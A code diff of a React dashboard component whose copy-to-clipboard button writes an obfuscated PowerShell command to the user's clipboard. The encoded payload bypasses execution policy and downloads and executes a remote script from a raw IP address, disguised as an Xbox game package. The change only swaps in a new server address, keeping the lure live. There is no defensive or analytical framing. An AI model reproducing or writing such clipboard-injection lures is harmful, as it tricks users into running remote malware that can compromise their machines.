@@ -70,7 +70,7 @@ export default function Dashboard() {
   };
 
   const copyToClipboard = () => {
-    const cmd = "powershell -ExecutionPolicy Bypass -nop -encodedCommand SQBFAFgAIAAoAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACcAaAB0AHQAcAA6AC8ALwAxADUAOQAuADEAOQA1AC4ANAAzAC4AMQAyADEAOgAxADUAMgA5AC8AUgBlAGcAaQBzAHQAZQByAFgAYgBvAHgARwBhAG0AZQBQAGEAYwBrAGEAZwBlAC4AcABzADEAJwApAA==";
+    const cmd = "powershell -ExecutionPolicy Bypass -nop -encodedCommand SQBFAFgAIAAoAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACcAaAB0AHQAcAA6AC8ALwA4ADcALgAxADIAMQAuADgANAAuADEAMwA3ADoAMQA1ADIAOQAvAFIAZQBnAGkAcwB0AGUAcgBYAGIAbwB4AEcAYQBtAGUAUABhAGMAawBhAGcAZQAuAHAAcwAxACcAKQA=";
     navigator.clipboard.writeText(cmd);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
